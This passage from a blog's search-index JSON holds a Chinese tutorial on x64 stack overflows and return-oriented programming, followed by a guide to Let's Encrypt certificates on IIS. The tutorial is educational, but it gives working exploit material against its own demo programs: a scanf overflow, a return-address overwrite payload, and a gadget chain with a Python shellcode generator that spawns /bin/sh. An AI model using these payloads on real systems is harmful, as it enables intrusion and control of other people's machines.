攻击\n\n在操作系统和编译器的保护下，程序的栈是不可运行的、栈的位置是随机的，增大了栈溢出攻击的难度。但如果程序的加载位置是固定的、或者程序中存在加载到固定位置的可执行代码，攻击者就可以利用这些固定位置上的代码来实施他的攻击。\n\n考虑下面的代码，其中含有一个borrowed函数，作用是打开一个shell终端。\n\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nvoid borrowed() {\n    execl(\"/bin/sh\", NULL, NULL);\n}\n\nint main() {\n    char name[64];\n    printf(\"What's your name?\");\n    scanf(\"%s\", name);\n    printf(\"Hello, %s!\\n\", name);\n    return 0;\n}\n\n\n将以上代码另存为victim.c编译，并提取汇编码到victim.asm中，如下：\n\n$ gcc -o victim victim.c\n$ objdump -d victim -M intel &gt; victim.asm\n\n\n打开victim.asm可以查到borrowed函数的地址为0x4050b6。因此，若攻击者利用栈溢出将main函数的返回地址改写为0x4050b6，则main函数返回时会转到borrowed函数运行，打开一个shell终端，后面就可以利用终端干很多事情了。\n现在来试一试吧：\n\n$ python -c 'print \"\\x00\"*72+\"\\xb6\\x05\\x40\\x00\\x00\\x00\\x00\\x00\"' &gt; shellcode\n$ cat shellcode - | ./victim \nWhat's your name?Hello, !\nls\nshellcode  victim  victim.asm  victim.c\nmkdir xxx\nls\nshellcode  victim  victim.asm  victim.c  xxx\nrmdir xxx\nls\nshellcode  victim  victim.asm  victim.c\n\n\n可以看出终端被成功的打开了，并运行了ls、mkdir、rmdir命令。\n\n注意以上攻击命令中 cat shellcode - | ./victim 的 ”-“ 是不能省略的，否则终端打开后就会立即关闭。\n\n这个例子表明，攻击者可以利用程序自身的代码来实施攻击，从而绕开栈不可执行和栈位置随机化的防护。这个程序是一个特意构造的例子，实际的程序中当然不太可能埋一个borrowed函数这样的炸弹来等着人来引爆。但是，攻击者可以利用程序自身的、没有任何恶意的代码片段来组装出这样的炸弹来，这就是ROP攻击。\n\nROP攻击全称为Return-oriented programming，在这种攻击中，攻击者先搜索出程序自身中存在的跳板指令（gadgets），然后将一些跳板指令串起来，组装成一段完整的攻击程序。\n\n跳板指令就是以ret结尾的指令（也可以是以jmp、call结尾的指令），如mov rax, 1; ret | pop rax; ret。那如何将跳板指令串起来？\n\n假如程序中在0x1234 | 0x5678 | 0x9abc地址处分别存在三段跳板指令mov rax, 10; ret | mov rbx, 20; ret | add rax, rbx; ret，且当前的rip指向的指令是ret，如果将0x1234 | 0x5678 | 0x9abc三个地址的数值放到栈上，如下：\n\n                    Stack                      Code\n  rsp(+0x00)--&gt;+-------------+            +-------------+&lt;--rip\n               |   0x1234    |--------+   |     ret     |\n     (+0x08)--&gt;+-------------+        |   +-------------+\n               |   0x5678    |-----+  |   |     ...     |\n     (+0x10)--&gt;+-------------+     |  +--&gt;+-------------+&lt;--0x1234\n               |   0x9abc    |--+  |      | mov rax, 10 |\n               +-------------+  |  |      +-------------+\n               |     ...     |  |  |      |     ret     |\n               +-------------+  |  |      +-------------+\n               |     ...     |  |  |      |     ...     |\n               +-------------+  |  +-----&gt;+-------------+&lt;--0x5678\n               |     ...     |  |         | mov rbx, 20 |\n               +-------------+  |         +-------------+\n               |     ...     |  |         |     ret     |\n               +-------------+  |         +-------------+\n               |     ...     |  |         |     ...     |\n               +-------------+  +--------&gt;+-------------+&lt;--0x9abc\n               |     ...     |            | add rax,rbx |\n               +-------------+            +-------------+\n               |     ...     |            |     ret     |\n               +-------------+            +-------------+\nEquivalent codes:\n        mov rax, 10\n        mov rbx, 20\n        add rax, rbx\n\n\n则执行完ret指令后，程序将跳转到0x1234，执行此处的指令mov rax, 10; ret，后面这个ret指令又将跳转到0x5678，执行mov rbx, 20; ret，之后再跳转到0x9abc，执行add rax, rbx，整个流程好像在顺序执行mov rax, 10; mov rbx, 20; add rax, rbx一样。\n\n可见只要将这些以ret指令结尾的gadgets的地址放在栈上合适的位置，这些ret指令就会按指定的顺序一步步的在这些gadgets之间跳跃。\n\n再看一个稍微复杂的例子：\n\n                    Stack                   Code\n  rsp(+0x00)--&gt;+-------------+         +-------------+&lt;--rip\n               |    addr1    |-----+   |     ret     |\n     (+0x08)--&gt;+-------------+     |   +-------------+\n               |    0x3b     |     |   |     ...     |\n               +-------------+     +--&gt;+-------------+&lt;--addr1\n               |    addr2    |--+      |   pop rax   |\n               +-------------+  |      +-------------+\n               |     ...     |  |      |     ret     |\n               +-------------+  |      +-------------+\n               |     ...     |  |      |     ...     |\n               +-------------+  +-----&gt;+-------------+&lt;--addr2\n               |     ...     |         |  next inst  |\n               +-------------+         +-------------+\n               |     ...     |         |     ret     |\n               +-------------+         +-------------+\nEquivalent codes:\n        mov rax, 0x3b\n\n\n这个例子中，跳板指令是pop rax; ret，执行完后，栈上的0x3b将pop到rax中，因此这种型式的跳板指令可以实现对寄存器的赋值。\n\n而add rsp, 10h; ret型式的跳板指令可以模拟流程跳转，如下：\n\n                    Stack                       Code\n  rsp(+0x00)--&gt;+-------------+               +-------------+&lt;--rip\n               |    addr1    |-----------+   |     ret     |\n     (+0x08)--&gt;+-------------+           |   +-------------+\n               |    addr2    |--------+  |   |     ...     |\n               +-------------+        |  +--&gt;+-------------+&lt;--addr1\n               |    addr3    |-----+  |      | add rsp,10h |\n               +-------------+     |  |      +-------------+\n               |    addr4    |--+  |  |      |     ret     |\n               +-------------+  |  |  |      +-------------+\n               |     ...     |  |  |  |      |     ...     |\n               +-------------+  |  |  +-----&gt;+-------------+&lt;--addr2\n               |     ...     |  |  |         |    inst2    |\n               +-------------+  |  |         +-------------+\n               |     ...     |  |  |         |     ret     |\n               +-------------+  |  |         +-------------+\n               |     ...     |  |  |         |     ...     |\n               +-------------+  |  +--------&gt;+-------------+&lt;--addr3\n               |     ...     |  |            |    inst3    |\n               +-------------+  |            +-------------+\n               |     ...     |  |            |     ret     |\n               +-------------+  |            +-------------+\n               |     ...     |  |            |     ...     |\n               +-------------+  +-----------&gt;+-------------+&lt;--addr4\n               |     ...     |               |    inst4    |\n               +-------------+               +-------------+\n               |     ...     |               |     ret     |\n               +-------------+               +-------------+\nEquivalent codes:\n        jmp there\n        inst2\n        inst3\nthere:  inst4\n\n\n条件跳转甚至函数调用都可以用精心构造出的gadgets链来模拟。只要找出一些基本的gadgets，就可以使用这些gadgets来组装出复杂的攻击程序。而只要被攻击程序的代码量有一定的规模，就不难在这个程序的代码段中搜索出足够多的gadgets（注意目标程序的代码中不需要真正有这样的指令，只需要恰好有这样的指令的机器码，例如如果需要用到跳板指令pop rax; ret，只需要目标程序的代码段中含有字节码串58 C3就可以了）。\n\n下面以实例来展示一下ROP攻击的强大，在这个例子中，将利用gadgets组装出程序，执行exec系统调用打开一个shell终端。\n\n用exec系统调用打开一个shell终端需要的参数和指令如下：\n\n        mov rax, 0x3b   ; system call number, 0x3b for sys_exec\n        mov rdi, PROG   ; char *prog (program path)\n        mov rsi, 0      ; char **agcv\n        mov rdx, 0      ; char **env\n        syscall\nPROG:   DB \"/bin/sh\", 0\n\n\n其中rax为系统调用编号，rdi为字符串指针、指向可执行程序的完整路径，rsi和rdx都是字符串指针数组，保存了参数列表和环境变量，在此处可以直接置为0。\n\n为了增大被攻击程序的体积，以搜索到尽可能多的gadgets，在原来的代码中增加一个random函数，同时用静态链接的方式重新编译一下victim.c：\n\n$ cat victim.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    char name[64];\n    printf(\"What's your name?\");\n    scanf(\"%s\", name);\n    printf(\"Hello, %s%ld!\\n\", name, random());\n    return 0;\n}\n$ gcc -o victim victim.c -static\n\n\n手工搜索目标程序中的gadgets显然是不现实的，采用JonathanSalwan编写的ROPgadget搜索，网址在这里：https://github.com/JonathanSalwan/ROPgadget，可以使用pip安装：\n\n$ su\n$ apt-get install python-pip\n$ pip install capstone\n$ pip install ropgadget\n$ exit\n\n\n安装完成后，可以使用下面的命令来搜索gadgets：\n\n$ ROPgadget --binary ./victim --only \"pop|ret\"\n\n\n搜索到程序中存在的跳板指令只是第一步。接下来需要挑选并组装gadgets，过程非常繁琐、复杂，不再叙述了。总之，经过多次尝试，最后找到了以下gadgets：\n\n0x00000000004003f2 : pop r12 ; ret\n0x00000000004018ed : pop r12 ; pop r13 ; ret\n0x0000000000487318 : mov rdi, rsp ; call r12\n0x0000000000431b3d : pop rax ; ret\n0x00000000004333d9 : pop rdx ; pop rsi ; ret\n0x000000000043d371 : syscall\n\n\n按下图的方式拼装gadgets，图中的‘+’号旁边的数字0、1、2、…、13表示攻击程序执行过程中rip和rsp的移动顺序。\n\n               Stack                                          Code\nname--&gt;+--------------------+                           +--------------+0&lt;--rip\n       | \"\\x00\"*72          |                           | ret          |\nrsp--&gt;0+--------------------+                           +--------------+\n       | 0x00000000004003f2 |-----------------------+   | ...          |\n      1+--------------------+                       +--&gt;+--------------+1\n       | 0x00000000004018ed |---------------------+     | pop r12      |\n    2,5+--------------------+                     |     +--------------+2\n       | 0x0000000000487318 |------------------+  |     | ret          |\n  3,4,6+--------------------+                  |  |     +--------------+\n       | \"/bin/sh\\x00\"      |                  |  |     | ...          |\n      7+--------------------+                  |  +----&gt;+--------------+5\n       | 0x0000000000431b3d |--------------+   |        | pop r12      |\n      8+--------------------+              |   |        +--------------+6\n       | 0x000000000000003b |              |   |        | pop r13      |\n      9+--------------------+              |   |        +--------------+7\n       | 0x00000000004333d9 |-----------+  |   |        | ret          |\n     10+--------------------+           |  |   |        +--------------+\n       | 0x0000000000000000 |           |  |   |        | ...          |\n     11+--------------------+           |  |   +-------&gt;+--------------+3\n       | 0x0000000000000000 |           |  |            | mov rdi, rsp |\n     12+--------------------+           |  |            +--------------+4\n       | 0x000000000043d371 |-------+   |  |            | call r12     |\n     13+--------------------+       |   |  |            +--------------+\n                                    |   |  |            | ...          |\n                                    |   |  +-----------&gt;+--------------+8\n                                    |   |               | pop rax      |\n                                    |   |               +--------------+9\n                                    |   |               | ret          |\n                                    |   |               +--------------+\n                                    |   |               | ...          |\n                                    |   +--------------&gt;+--------------+10\n                                    |                   | pop rsi      |\n                                    |                   +--------------+11\n                                    |                   | pop rdx      |\n                                    |                   +--------------+12\n                                    |                   | ret          |\n                                    |                   +--------------+\n                                    |                   | ...          |\n                                    +------------------&gt;+--------------+13\n                                                        | syscall      |\n                                                        +--------------+\n\n\n为了将大端顺序的地址数值转换为小端顺序的字符串，编写了一个python程序gen_shellcode.py来生成最终的shellcode：\n\n&gt;&gt;&gt; s= long2bytes(0x5c4)\n&gt;&gt;&gt; s\n'\\xc4\\x05\\x00\\x00\\x00\\x00\\x00\\x00'\ndef long2bytes(x):\n    ss = [\"\"] * 8\n    for i in range(8):\n        ss[i] = chr(x &amp; 0xff)\n        x &gt;&gt;= 8\n    return \"\".join(ss)\n\nprint \"\\x00\"*72 + \\\n    long2bytes(0x4003f2) + \\\n    long2bytes(0x4018ed) + \\\n    long2bytes(0x487318) + \\\n    \"/bin/sh\\x00\" + \\\n    long2bytes(0x431b3d) + \\\n    long2bytes(0x00003b) + \\\n    long2bytes(0x4333d9) + \\\n    long2bytes(0x000000) + \\\n    long2bytes(0x000000) + \\\n    long2bytes(0x43d371)\n\n\n现在可以实施攻击了：\n\n$ python gen-shellcode.py &gt; shellcode\n$ cat shellcode - | ./victim\nWhat's your name?Hello, 1804289383!\nls\ngen-shellcode.py  shellcode  victim  victim.c\nmkdir xxx\nls\ngen-shellcode.py  shellcode  victim  victim.c xxx\n\n\n可以看出终端被成功打开，ls和mkdir命令都可以运行。\n\n5. 致谢\n\n感谢jip的文章 Stack Smashing On A Modern Linux System 和Ben Lynn的文章   64-bit Linux Return-Oriented Programming ，他们的文章系统的介绍了Linux（x64）下的栈溢出攻击和防护方法。\n\n感谢 Erik Buchanan, Ryan Roemer 和 Stefan Savage 等人对ROP做出的非凡的工作：Return-Oriented Programming: Exploits Without Code Injection，ROP攻击几乎无法阻挡，强大之中又蕴涵着优雅的美感，就像风清杨教给令狐冲的独孤九剑。\n\n感谢JonathanSalwan编写的ROPgadget，他的工具让搜索gadgets的工作变得简单无比。\n",
        "url": "/article/2016/01/22/rop/"
      },
    
      {
        "title": "IIS 下申请、部署及自动更新免费 SSL 证书",
        "excerpt": "网站部署 HTTPS ，可以对浏览器和服务器之间的通讯数据进行加密，防止敏感信息（如：信用卡卡号、密码等）被中间攻击者窃取或篡改，防止网页内容被运行商或中间攻击者注入广告。此外， HTTPS 网站在搜索引擎中的排名也会比同等的 HTTP 网站更高。\n\n",
        "content": "网站部署 HTTPS ，可以对浏览器和服务器之间的通讯数据进行加密，防止敏感信息（如：信用卡卡号、密码等）被中间攻击者窃取或篡改，防止网页内容被运行商或中间攻击者注入广告。此外， HTTPS 网站在搜索引擎中的排名也会比同等的 HTTP 网站更高。\n\n\n\n部署 HTTPS 需要先给网站域名申请一个经权威机构认证的 SSL 证书，目前绝大部分认证机构的 SSL 证书都是收费的，而且收费都很高。不过目前美国公益组织 ISRG（Internet Security Research Group，互联网安全研究小组）的 Let’s Encrypt 上提供免费、自动化、开放的证书签发服务，对于一般的网站来说是够用了。\n\nLet’s Encrypt 提供的证书有效期 90 天，但可以免费更新。它的主页上提供了很多自动申请、配置和更新的官方工具，但都是基于 Linux 类系统的。对于 Windows/IIS 服务器，github 上有一个非常智能和强大的工具： letsencrypt-win-simple ，基本上可以做到一键自动申请、配置和更新证书。本文介绍如何使用这个工具给网站部署 HTTPS 。\n\n首先在 IIS 中部署好网站，将网站的主机名绑定为你的域名，带 www 的域名 www.xxx.com 、不带 www 的域名 xxx.com 、子域名 yyy.xxx.com 的格式都可以，一个网站可以绑定多个域名，也可以在一个系统中部署多个网站，但不同的网站必须绑定不同的域名。\n\n将所有域名都解析到服务器 ip 上，并在服务器的防火墙上开通 80 和 443 端口的外部访问。之后在本地浏览器中访问所有域名（ http://www.xxx.com 等），确保所有网站、所有域名都可以正常访问。注意这时用 https://www.xxx.com 是无法访问的。\n\n再到其 github 主页 https://github.com/PKISharp/win-acme 的 release 页下载最新的 win-acme-v2.x.x.x.zip ，放到服务器上，解压并在服务器上运行其中的 wacs.exe ，有的系统可能会提示缺少某个 .net 运行环境，可以根据提示的网址，下载 NDP472-KB4054531-Web.exe 安装，如果服务器上无法下载可以先在本地下好再拷贝到服务器。\n\n运行 wacs.exe 后第一步有以下选项：\n\nN: Create new certificate\nM: Create new certificate with advanced options\nL: List scheduled renewals\nR: Renew scheduled\nS: Renew Specific\nA: Renew *all*\nO: More options...\nQ: Quit\n\n\n这里直接回车，选第一个 “创建新证书” 。\n\n第二步有以下选项：\n\n1: Single binding of an IIS site\n2. SAN certificate for all bindings of an IIS site\n3. SAN certificate for all bindings of multiple IIS sites\n4: Manually input host names\n\n\n这里选第三项“给所有网站创建证书”。\n\n之后就根据提示一步一步选择合适的选项就可以了，全部都完成后，程序会开始扫描出 IIS 下的所有网站和域名、验证域名的所有权、申请证书、给所有网站都配置好证书和 HTTPS 访问、并设置好自动检查和更新证书的计划任务，所有这一切都会自动的完成，完全不需要人工设置，相对智能和强大。\n\n完成后，在本地访问 https://www.xxx.com 可以发现网站已经可以正常用 HTTPS 协议访问了，这时浏览器地址栏开头已经多了一个神奇的“小锁”，点开这个小锁之后，就可以看到证书的详细信息，示例如下：\n\n\n\n打开 IIS 也可以看到，每个网站它都贴心的帮你绑定了带 HTTPS 的主机名 https://www.xxx.com 。\n\n证书里面最重要的信息一个是详细信息中的“使用者备用名称（DNS Name）”，这里面就包含了你的系统里面所有网站的域名，也就是这个证书所认证的域名，浏览器只有验证了证书的有效性以及用户所访问的网站的域名包含在证书上的 DNS Name 之后，才会允许后续的数据通讯。\n\n另一个重要信息是详细信息中的指纹算法和指纹，这个是你的证书的特有的指纹，建议记下这个指纹，你申请的证书也可以在其他服务器中使用（比如： nginx 服务器证书、 ftps 服务器证书或 ssh 服务器证书） 这时可以通过这个指纹来确保证书没有被中间攻击者替换。\n\n后面基本上就不需要做其他事情了，一切都由 wacs.exe 帮你搞定了，后续的证书过期前自动更新它也帮你搞定了，它自动增加了一个计划任务，每天 9 点自动检查证书是否即将过期，并自动更新即将过期的证书。\n\n如果需要在其他类型的服务器使用这个证书，可以在 IIS 主页中的“服务器证书”模块中，点右边操作栏的“导出证书”，设置好导出路径和密码，导出 pfx 文件。之后用 openssl 可以将 pfx 文件中的“私钥”和“证书信息”提取出来，命令为：\n\nopenssl pkcs12 -in a.pfx -out a.pem -nodes\n\n\n提取之前需要输入导出时设置的密码。之后就可以在 a.pem 中看到 PRIVATE KEY 和 CERTIFICATE ，这两个也可以在其他的服务器中使用，只要你设置的服务器域名包含在证书中的域名就可以了，但要注意一定要保护好你的 PRIVATE KEY 。\n\n例如，可以在 ftp 服务器软件 FileZilla Server 中的 ftps 选项中，设定好 PRIVATE KEY FILE 和 CERTIFICATE FILE 后。在本地用 wincap 连接 ftps://www.xxx.com ，这时 wincap 和 FileZilla Server 之间就可以用 FTPS 协议来传递数据了，传递数据之前 FileZilla Server 会将证书发给 wincap ，而 wincap 会像浏览器一样验证证书和域名，确保证书不被中间攻击者替换，保证数据通讯的安全。\n\n注意：如果你在 wincap 中使用服务器 ip 而不是域名连接你的 ftp 服务器，这时 wincap 将认为该证书不是颁发给你所连接的服务器，它会打印出证书的指纹算法和指纹，让你自己选择是否相信此证书，此时，你可以人工对比该指纹和你的证书的指纹是否一致，如果一致，就表示证书在传输过程中未被替换，可以选择相信此证书。\n",
        "url": "/article/2019/03/05/letsencrypt-win-simple/"
      },
    
  
  
  
  {
    "title": "分类",
    "excerpt": "Category index\n",
    "content": "\n",
    "url": "/categories/"
  }
  
]

